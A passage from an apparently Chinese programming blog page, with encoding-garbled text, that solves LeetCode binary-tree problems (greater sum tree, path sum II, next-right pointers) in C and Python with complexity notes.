flag2)</span><br><span class="line">        &#123;</span><br><span class="line">            ret[<span class="number">0</span>] = start;</span><br><span class="line">            ret[<span class="number">1</span>] = end;</span><br><span class="line">            <span class="keyword">return</span> ret;</span><br><span class="line">        &#125;</span><br><span class="line">        union_set(start,end);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ï¼ˆå‡å°‘å·®ä¸å¤šä¸€åŠç©ºé—´ï¼Œ<del>ä½†æ˜¯çœ‹èµ·æ¥å¹¶æ²¡æœ‰ä»€ä¹ˆç”¨</del>â€¦ï¼‰</p><p><img src="https://i.loli.net/2020/09/17/Hsxip4fmnoXAyvC.png" alt="image.png"></p><h2 id="0x02-ä»äºŒå‰æœç´¢æ ‘åˆ°æ›´å¤§å’Œæ ‘"><a href="#0x02-ä»äºŒå‰æœç´¢æ ‘åˆ°æ›´å¤§å’Œæ ‘" class="headerlink" title="0x02.ä»äºŒå‰æœç´¢æ ‘åˆ°æ›´å¤§å’Œæ ‘"></a>0x02.<a href="https://leetcode-cn.com/problems/binary-search-tree-to-greater-sum-tree/">ä»äºŒå‰æœç´¢æ ‘åˆ°æ›´å¤§å’Œæ ‘</a></h2><blockquote><p>ç»™å‡ºäºŒå‰ æœç´¢ æ ‘çš„æ ¹èŠ‚ç‚¹ï¼Œè¯¥äºŒå‰æ ‘çš„èŠ‚ç‚¹å€¼å„ä¸ç›¸åŒï¼Œä¿®æ”¹äºŒå‰æ ‘ï¼Œä½¿æ¯ä¸ªèŠ‚ç‚¹ node çš„æ–°å€¼ç­‰äºåŸæ ‘ä¸­å¤§äºæˆ–ç­‰äº node.val çš„å€¼ä¹‹å’Œã€‚</p><p>æé†’ä¸€ä¸‹ï¼ŒäºŒå‰æœç´¢æ ‘æ»¡è¶³ä¸‹åˆ—çº¦æŸæ¡ä»¶ï¼š</p><p>èŠ‚ç‚¹çš„å·¦å­æ ‘ä»…åŒ…å«é”® å°äº èŠ‚ç‚¹é”®çš„èŠ‚ç‚¹ã€‚<br>èŠ‚ç‚¹çš„å³å­æ ‘ä»…åŒ…å«é”® å¤§äº èŠ‚ç‚¹é”®çš„èŠ‚ç‚¹ã€‚<br>å·¦å³å­æ ‘ä¹Ÿå¿…é¡»æ˜¯äºŒå‰æœç´¢æ ‘ã€‚</p><p>ç¤ºä¾‹ï¼š</p><p><img src="https://i.loli.net/2020/09/21/RaA7r8BHmc9K2yX.png" alt="image.png"></p><p>è¾“å…¥ï¼š[4,1,6,0,2,5,7,null,null,null,3,null,null,null,8]<br>è¾“å‡ºï¼š[30,36,21,36,35,26,15,null,null,null,33,null,null,null,8]</p><p>æç¤ºï¼š</p><p>æ ‘ä¸­çš„èŠ‚ç‚¹æ•°ä»‹äº 1 å’Œ 100 ä¹‹é—´ã€‚<br>æ¯ä¸ªèŠ‚ç‚¹çš„å€¼ä»‹äº 0 å’Œ 100 ä¹‹é—´ã€‚<br>ç»™å®šçš„æ ‘ä¸ºäºŒå‰æœç´¢æ ‘ã€‚</p><p>æ³¨æ„ï¼šè¯¥é¢˜ç›®ä¸ 538: <a href="https://leetcode-cn.com/problems/convert-bst-to-greater-tree/">https://leetcode-cn.com/problems/convert-bst-to-greater-tree/</a>  ç›¸åŒ</p><p>æ¥æºï¼šåŠ›æ‰£ï¼ˆLeetCodeï¼‰<br>é“¾æ¥ï¼š<a href="https://leetcode-cn.com/problems/binary-search-tree-to-greater-sum-tree">https://leetcode-cn.com/problems/binary-search-tree-to-greater-sum-tree</a><br>è‘—ä½œæƒå½’é¢†æ‰£ç½‘ç»œæ‰€æœ‰ã€‚å•†ä¸šè½¬è½½è¯·è”ç³»å®˜æ–¹æˆæƒï¼Œéå•†ä¸šè½¬è½½è¯·æ³¨æ˜å‡ºå¤„ã€‚</p></blockquote><p>è¿™é“é¢˜å’Œä¸Šé¢<strong>ã€éš¾åº¦ï¼šç®€å•ã€‘0x03.æŠŠäºŒå‰æœç´¢æ ‘è½¬æ¢ä¸ºç´¯åŠ æ ‘</strong>æ˜¯<strong>ä¸€æ¨¡ä¸€æ ·çš„</strong>ï¼ˆ<del>æ‰€ä»¥è¯´ä¸ºä»€ä¹ˆæ¢ä¸€ä¸ªåå­—éš¾åº¦å°±å˜æˆä¸­ç­‰äº†å•Š</del></p><p><strong>äºŒå‰æœç´¢æ ‘</strong>æœ‰ä¸€ä¸ªç‰¹ç‚¹å°±æ˜¯<strong>ç»“ç‚¹å·¦å­æ ‘çš„ç»“ç‚¹éƒ½æ¯”è¯¥ç»“ç‚¹å°ï¼Œå³å­æ ‘çš„ç»“ç‚¹éƒ½æ¯”è¯¥ç»“ç‚¹å¤§</strong>ï¼Œå› è€Œå«äºŒå‰æœç´¢æ ‘ï¼Œå¯ä»¥ç”¨ä»¥å¤§å¹…ç¼©çŸ­æœç´¢çš„æ—¶é—´</p><h3 id="è§£æ³•ï¼šæ·±åº¦ä¼˜å…ˆæœç´¢-ååºä¸­åºéå†-1"><a href="#è§£æ³•ï¼šæ·±åº¦ä¼˜å…ˆæœç´¢-ååºä¸­åºéå†-1" class="headerlink" title="è§£æ³•ï¼šæ·±åº¦ä¼˜å…ˆæœç´¢ + ååºä¸­åºéå†"></a>è§£æ³•ï¼šæ·±åº¦ä¼˜å…ˆæœç´¢ + ååºä¸­åºéå†</h3><p>ç”±äºäºŒå‰æŸ¥æ‰¾æ ‘çš„è¿™ä¸ªç‰¹æ€§ï¼Œæˆ‘ä»¬è€ƒè™‘<strong>é€’å½’å®ç°çš„æ·±åº¦ä¼˜å…ˆæœç´¢</strong>ç®—æ³•ï¼Œé€šè¿‡<strong>ååºä¸­åºéå†</strong>æ¥å®ç°ï¼Œè¿‡ç¨‹å¦‚ä¸‹ï¼š</p><ul><li><strong>éå†å³å­æ ‘ï¼Œå°†å³å­æ ‘ç»“ç‚¹å€¼åŠ åˆ°summary</strong></li><li><strong>å°†å½“å‰ç»“ç‚¹å€¼åŠ åˆ°summary</strong></li><li><strong>å°†å½“å‰ç»“ç‚¹å€¼ç½®ä¸ºsummary</strong></li><li><strong>éå†å·¦å­æ ‘</strong></li></ul><p>æ¯ä¸ªç»“ç‚¹éœ€è¦ä¸€ä¸ªé¢å¤–çš„æ ˆç©ºé—´ï¼Œå› è€Œç©ºé—´å¤æ‚åº¦ä¸º<strong>O</strong>(<strong>N</strong>)ï¼›éœ€è¦éå†æ¯ä¸ªç»“ç‚¹ä¸€æ¬¡ï¼Œå› è€Œæ—¶é—´å¤æ‚åº¦ä¸º<strong>O</strong>(<strong>N</strong>)</p><p>æ„é€ ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * struct TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     struct TreeNode *left;</span></span><br><span class="line"><span class="comment"> *     struct TreeNode *right;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> sum;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">dfs</span><span class="params">(<span class="keyword">struct</span> TreeNode* root)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(!root)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    dfs(root-&gt;right);</span><br><span class="line">    sum+=root-&gt;val;</span><br><span class="line">    root-&gt;val=sum;</span><br><span class="line">    dfs(root-&gt;left);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> TreeNode* <span class="title function_">bstToGst</span><span class="params">(<span class="keyword">struct</span> TreeNode* root)</span></span><br><span class="line">&#123;</span><br><span class="line">    sum = <span class="number">0</span>;</span><br><span class="line">    dfs(root);</span><br><span class="line">    <span class="keyword">return</span> root;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/09/21/hx5F6qdKp2tzr7D.png" alt="image.png"></p><h2 id="0x03-è·¯å¾„æ€»å’Œ-II"><a href="#0x03-è·¯å¾„æ€»å’Œ-II" class="headerlink" title="0x03.è·¯å¾„æ€»å’Œ II"></a>0x03.<a href="https://leetcode-cn.com/problems/path-sum-ii/">è·¯å¾„æ€»å’Œ II</a></h2><blockquote><p>ç»™å®šä¸€ä¸ªäºŒå‰æ ‘å’Œä¸€ä¸ªç›®æ ‡å’Œï¼Œæ‰¾åˆ°æ‰€æœ‰ä»æ ¹èŠ‚ç‚¹åˆ°å¶å­èŠ‚ç‚¹è·¯å¾„æ€»å’Œç­‰äºç»™å®šç›®æ ‡å’Œçš„è·¯å¾„ã€‚</p><p>è¯´æ˜: å¶å­èŠ‚ç‚¹æ˜¯æŒ‡æ²¡æœ‰å­èŠ‚ç‚¹çš„èŠ‚ç‚¹ã€‚</p><p>ç¤ºä¾‹:<br>ç»™å®šå¦‚ä¸‹äºŒå‰æ ‘ï¼Œä»¥åŠç›®æ ‡å’Œ sum &#x3D; 22ï¼Œ</p><pre><code>       5      / \     4   8    /   / \   11  13  4</code></pre><p>   &#x2F;  \    &#x2F; <br>   7    2  5   1</p><p>è¿”å›:</p><p>[<br>[5,4,11,2],<br>[5,8,4,5]<br>]</p><p>æ¥æºï¼šåŠ›æ‰£ï¼ˆLeetCodeï¼‰<br>é“¾æ¥ï¼š<a href="https://leetcode-cn.com/problems/path-sum-ii">https://leetcode-cn.com/problems/path-sum-ii</a><br>è‘—ä½œæƒå½’é¢†æ‰£ç½‘ç»œæ‰€æœ‰ã€‚å•†ä¸šè½¬è½½è¯·è”ç³»å®˜æ–¹æˆæƒï¼Œéå•†ä¸šè½¬è½½è¯·æ³¨æ˜å‡ºå¤„ã€‚</p></blockquote><h3 id="è§£æ³•ï¼šæ·±åº¦ä¼˜å…ˆæœç´¢ï¼ˆDFSï¼‰-é€’å½’ä¸­åºéå†"><a href="#è§£æ³•ï¼šæ·±åº¦ä¼˜å…ˆæœç´¢ï¼ˆDFSï¼‰-é€’å½’ä¸­åºéå†" class="headerlink" title="è§£æ³•ï¼šæ·±åº¦ä¼˜å…ˆæœç´¢ï¼ˆDFSï¼‰+ é€’å½’ä¸­åºéå†"></a>è§£æ³•ï¼šæ·±åº¦ä¼˜å…ˆæœç´¢ï¼ˆDFSï¼‰+ é€’å½’ä¸­åºéå†</h3><p>ä¸­åºéå†ï¼Œä¸€å±‚ä¸€å±‚åœ°æœä¸‹å»å°±å®Œäº‹äº†ï¼Œç”¨ä¸€ä¸ªæ ˆæ¥ä¿å­˜è·¯å¾„ï¼Œé‡åˆ°å¶å­ç»“ç‚¹ä¸”åˆšå¥½åˆ°äº†è¿™ä¸€å±‚æ—¶sumå·²ç»è¢«å‡åˆ°0äº†å°±ä¿å­˜è·¯å¾„</p><p>éœ€è¦æ³¨æ„çš„æ˜¯<strong>åœ¨æ¯ä¸€å±‚æœç´¢ç»“æŸåéƒ½è¦å°†è¯¥å±‚ç»“ç‚¹å¼¹å‡ºæ ˆ</strong></p><p>æ„é€ ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * struct TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     struct TreeNode *left;</span></span><br><span class="line"><span class="comment"> *     struct TreeNode *right;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Return an array of arrays of size *returnSize.</span></span><br><span class="line"><span class="comment"> * The sizes of the arrays are returned as *returnColumnSizes array.</span></span><br><span class="line"><span class="comment"> * Note: Both returned array and *columnSizes array must be malloced, assume caller calls free().</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> **retn;</span><br><span class="line"><span class="type">int</span> *<span class="built_in">set</span>;</span><br><span class="line"><span class="type">int</span> nums;</span><br><span class="line"><span class="type">int</span> retn_nums;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">dfs</span><span class="params">(<span class="keyword">struct</span> TreeNode* root, <span class="type">int</span> sum, <span class="type">int</span>** returnColumnSizes)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(!root)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    </span><br><span class="line">    sum -= root-&gt;val;</span><br><span class="line">    <span class="built_in">set</span>[nums++] = root-&gt;val;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!root-&gt;left &amp;&amp; !root-&gt;right &amp;&amp; !sum)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> * path = (<span class="type">int</span>*) <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">int</span>) * nums);</span><br><span class="line">        <span class="built_in">memcpy</span>(path, <span class="built_in">set</span>, <span class="keyword">sizeof</span>(<span class="type">int</span>) * nums);</span><br><span class="line">        (*returnColumnSizes)[retn_nums] = nums;</span><br><span class="line">        retn[retn_nums++] = path;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    dfs(root-&gt;left,sum,returnColumnSizes);</span><br><span class="line">    dfs(root-&gt;right,sum,returnColumnSizes);</span><br><span class="line">    nums--;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span>** <span class="title function_">pathSum</span><span class="params">(<span class="keyword">struct</span> TreeNode* root, <span class="type">int</span> sum, <span class="type">int</span>* returnSize, <span class="type">int</span>** returnColumnSizes)</span></span><br><span class="line">&#123;</span><br><span class="line">    retn_nums = nums = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">set</span> = (<span class="type">int</span>*) <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">int</span>)*<span class="number">1000</span>);</span><br><span class="line">    retn = (<span class="type">int</span>**)<span class="built_in">calloc</span>(<span class="number">1000</span>,<span class="keyword">sizeof</span>(<span class="type">int</span>*));</span><br><span class="line">    <span class="keyword">if</span>(!root)</span><br><span class="line">    &#123;</span><br><span class="line">        *returnSize = <span class="number">0</span>;</span><br><span class="line">        (*returnColumnSizes)[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    dfs(root,sum,returnColumnSizes);</span><br><span class="line">    *returnSize = retn_nums;</span><br><span class="line">    <span class="keyword">return</span> retn;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/09/26/oqx2CRyb9JMavBZ.png" alt="image.png"></p><h2 id="0x04-å¡«å……æ¯ä¸ªèŠ‚ç‚¹çš„ä¸‹ä¸€ä¸ªå³ä¾§èŠ‚ç‚¹æŒ‡é’ˆ-II"><a href="#0x04-å¡«å……æ¯ä¸ªèŠ‚ç‚¹çš„ä¸‹ä¸€ä¸ªå³ä¾§èŠ‚ç‚¹æŒ‡é’ˆ-II" class="headerlink" title="0x04.å¡«å……æ¯ä¸ªèŠ‚ç‚¹çš„ä¸‹ä¸€ä¸ªå³ä¾§èŠ‚ç‚¹æŒ‡é’ˆ II"></a>0x04.<a href="https://leetcode-cn.com/problems/populating-next-right-pointers-in-each-node-ii/">å¡«å……æ¯ä¸ªèŠ‚ç‚¹çš„ä¸‹ä¸€ä¸ªå³ä¾§èŠ‚ç‚¹æŒ‡é’ˆ II</a></h2><blockquote><p>ç»™å®šä¸€ä¸ªäºŒå‰æ ‘</p><p>struct Node {<br>  int val;<br>  Node *left;<br>  Node *right;<br>  Node *next;<br>}<br>å¡«å……å®ƒçš„æ¯ä¸ª next æŒ‡é’ˆï¼Œè®©è¿™ä¸ªæŒ‡é’ˆæŒ‡å‘å…¶ä¸‹ä¸€ä¸ªå³ä¾§èŠ‚ç‚¹ã€‚å¦‚æœæ‰¾ä¸åˆ°ä¸‹ä¸€ä¸ªå³ä¾§èŠ‚ç‚¹ï¼Œåˆ™å°† next æŒ‡é’ˆè®¾ç½®ä¸º NULLã€‚</p><p>åˆå§‹çŠ¶æ€ä¸‹ï¼Œæ‰€æœ‰ next æŒ‡é’ˆéƒ½è¢«è®¾ç½®ä¸º NULLã€‚</p><p>è¿›é˜¶ï¼š</p><p>ä½ åªèƒ½ä½¿ç”¨å¸¸é‡çº§é¢å¤–ç©ºé—´ã€‚<br>ä½¿ç”¨é€’å½’è§£é¢˜ä¹Ÿç¬¦åˆè¦æ±‚ï¼Œæœ¬é¢˜ä¸­é€’å½’ç¨‹åºå ç”¨çš„æ ˆç©ºé—´ä¸ç®—åšé¢å¤–çš„ç©ºé—´å¤æ‚åº¦ã€‚</p><p>ç¤ºä¾‹ï¼š</p><p><img src="https://assets.leetcode-cn.com/aliyun-lc-upload/uploads/2019/02/15/117_sample.png" alt="image.png"></p><p>è¾“å…¥ï¼šroot &#x3D; [1,2,3,4,5,null,7]<br>è¾“å‡ºï¼š[1,#,2,3,#,4,5,7,#]<br>è§£é‡Šï¼šç»™å®šäºŒå‰æ ‘å¦‚å›¾ A æ‰€ç¤ºï¼Œä½ çš„å‡½æ•°åº”è¯¥å¡«å……å®ƒçš„æ¯ä¸ª next æŒ‡é’ˆï¼Œä»¥æŒ‡å‘å…¶ä¸‹ä¸€ä¸ªå³ä¾§èŠ‚ç‚¹ï¼Œå¦‚å›¾ B æ‰€ç¤ºã€‚</p><p>æç¤ºï¼š</p><p>æ ‘ä¸­çš„èŠ‚ç‚¹æ•°å°äº 6000<br>-100 &lt;&#x3D; node.val &lt;&#x3D; 100</p><p>æ¥æºï¼šåŠ›æ‰£ï¼ˆLeetCodeï¼‰<br>é“¾æ¥ï¼š<a href="https://leetcode-cn.com/problems/populating-next-right-pointers-in-each-node-ii">https://leetcode-cn.com/problems/populating-next-right-pointers-in-each-node-ii</a><br>è‘—ä½œæƒå½’é¢†æ‰£ç½‘ç»œæ‰€æœ‰ã€‚å•†ä¸šè½¬è½½è¯·è”ç³»å®˜æ–¹æˆæƒï¼Œéå•†ä¸šè½¬è½½è¯·æ³¨æ˜å‡ºå¤„ã€‚</p></blockquote><blockquote><p>æ³¨ï¼šæœ¬é¢˜ä¸º2020.9.28çš„æ¯æ—¥ä¸€é¢˜</p></blockquote><h3 id="è§£æ³•ä¸€ï¼šå±‚æ¬¡éå†"><a href="#è§£æ³•ä¸€ï¼šå±‚æ¬¡éå†" class="headerlink" title="è§£æ³•ä¸€ï¼šå±‚æ¬¡éå†"></a>è§£æ³•ä¸€ï¼šå±‚æ¬¡éå†</h3><p>æˆ‘ä»¬è€ƒè™‘åˆ°å½“æˆ‘ä»¬å¡«å……nextæŒ‡é’ˆå°†æ¯ä¸€å±‚çš„ç»“ç‚¹éƒ½è¿æ¥èµ·æ¥åï¼Œ<strong>è¯¥å±‚æ‰€æœ‰ç»“ç‚¹ä¾¿æ„æˆäº†ä¸€ä¸ªå•å‘é“¾è¡¨</strong>ï¼Œæˆ‘ä»¬å¯ä»¥<strong>é€šè¿‡éå†æ¯ä¸€å±‚çš„é“¾è¡¨æ¥æ„é€ ä¸‹ä¸€å±‚çš„é“¾è¡¨</strong></p><p>å¤§è‡´è¿‡ç¨‹å¦‚ä¸‹å›¾</p><p><img src="https://i.loli.net/2020/09/28/485DnfumcRterSM.png" alt="BD12E33FCF6E3B97FC6DB3AF5B645CF2.png"></p><h4 id="æ—¶é—´å¤æ‚åº¦ï¼š-1"><a href="#æ—¶é—´å¤æ‚åº¦ï¼š-1" class="headerlink" title="æ—¶é—´å¤æ‚åº¦ï¼š"></a>æ—¶é—´å¤æ‚åº¦ï¼š</h4><p>ç”±äºæ¯ä¸ªç»“ç‚¹éƒ½è¦éå†ä¸€æ¬¡ï¼Œæ•…æ—¶é—´å¤æ‚åº¦ä¸º<strong>O</strong>(<strong>N</strong>)</p><h4 id="ç©ºé—´å¤æ‚åº¦ï¼š-1"><a href="#ç©ºé—´å¤æ‚åº¦ï¼š-1" class="headerlink" title="ç©ºé—´å¤æ‚åº¦ï¼š"></a>ç©ºé—´å¤æ‚åº¦ï¼š</h4><p>ç”±äºæ²¡æœ‰ä½¿ç”¨åˆ°é¢å¤–çš„ç©ºé—´ï¼Œæ•…ç©ºé—´å¤æ‚åº¦ä¸º<strong>O</strong>(<strong>1</strong>)</p><h4 id="Cè¯­è¨€ç‰ˆï¼š-1"><a href="#Cè¯­è¨€ç‰ˆï¼š-1" class="headerlink" title="Cè¯­è¨€ç‰ˆï¼š"></a>Cè¯­è¨€ç‰ˆï¼š</h4><p>æˆ‘ä¹ˆå¯ä»¥å¾—åˆ°å¦‚ä¸‹ä»£ç ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">/**</span><br><span class="line"> * Definition for a Node.</span><br><span class="line"> * struct Node &#123;</span><br><span class="line"> *     int val;</span><br><span class="line"> *     struct Node *left;</span><br><span class="line"> *     struct Node *right;</span><br><span class="line"> *     struct Node *next;</span><br><span class="line"> * &#125;;</span><br><span class="line"> */</span><br><span class="line"></span><br><span class="line">struct Node * last_node, *next_start;</span><br><span class="line"></span><br><span class="line">void connectList(struct Node * node)</span><br><span class="line">&#123;</span><br><span class="line">    if(last_node)</span><br><span class="line">    &#123;</span><br><span class="line">        last_node-&gt;next = node;</span><br><span class="line">    &#125;</span><br><span class="line">    if(!next_start)</span><br><span class="line">    &#123;</span><br><span class="line">        next_start = node;</span><br><span class="line">    &#125;</span><br><span class="line">    last_node = node;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">struct Node *connect(struct Node *root) </span><br><span class="line">&#123;</span><br><span class="line">    if (!root)</span><br><span class="line">        return NULL;</span><br><span class="line"></span><br><span class="line">    struct Node *start = root;</span><br><span class="line">    while(start)</span><br><span class="line">    &#123;</span><br><span class="line">        last_node = NULL, next_start = NULL;</span><br><span class="line">        while(start)</span><br><span class="line">        &#123;</span><br><span class="line">            if(start-&gt;left)</span><br><span class="line">                connectList(start-&gt;left);</span><br><span class="line">            if(start-&gt;right)</span><br><span class="line">                connectList(start-&gt;right);</span><br><span class="line">            start = start-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        start = next_start;</span><br><span class="line">    &#125;</span><br><span class="line">    return root;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/09/28/tmKaLsnblvDce9H.png" alt="_XU940OX_R1_5XJK_H@N~5I.png"></p><h4 id="Pythonè¯­è¨€ç‰ˆï¼š-1"><a href="#Pythonè¯­è¨€ç‰ˆï¼š-1" class="headerlink" title="Pythonè¯­è¨€ç‰ˆï¼š"></a>Pythonè¯­è¨€ç‰ˆï¼š</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string"># Definition for a Node.</span></span><br><span class="line"><span class="string">class Node:</span></span><br><span class="line"><span class="string">    def __init__(self, val: int = 0, left: &#x27;Node&#x27; = None, right: &#x27;Node&#x27; = None, next: &#x27;Node&#x27; = None):</span></span><br><span class="line"><span class="string">        self.val = val</span></span><br><span class="line"><span class="string">        self.left = left</span></span><br><span class="line"><span class="string">        self.right = right</span></span><br><span class="line"><span class="string">        self.next = next</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.last_node: <span class="string">&#x27;Node&#x27;</span></span><br><span class="line">        self.next_start: <span class="string">&#x27;Node&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">connect</span>(<span class="params">self, root: <span class="string">&#x27;Node&#x27;</span></span>) -&gt; <span class="string">&#x27;Node&#x27;</span>:</span><br><span class="line">        <span class="keyword">if</span> root == <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">return</span> root</span><br><span class="line"></span><br><span class="line">        start = root</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> start != <span class="literal">None</span>:</span><br><span class="line">            self.last_node = <span class="literal">None</span></span><br><span class="line">            self.next_start = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">while</span> start != <span class="literal">None</span>:</span><br><span class="line">                <span class="keyword">if</span> start.left != <span class="literal">None</span>:</span><br><span class="line">                    <span class="keyword">if</span> self.last_node != <span class="literal">None</span>:</span><br><span class="line">                        self.last_node.<span class="built_in">next</span> = start.left</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> self.next_start == <span class="literal">None</span>:</span><br><span class="line">                        self.next_start = start.left</span><br><span class="line"></span><br><span class="line">                    self.last_node = start.left</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> start.right != <span class="literal">None</span>:</span><br><span class="line">                    <span class="keyword">if</span> self.last_node != <span class="literal">None</span>:</span><br><span class="line">                        self.last_node.<span 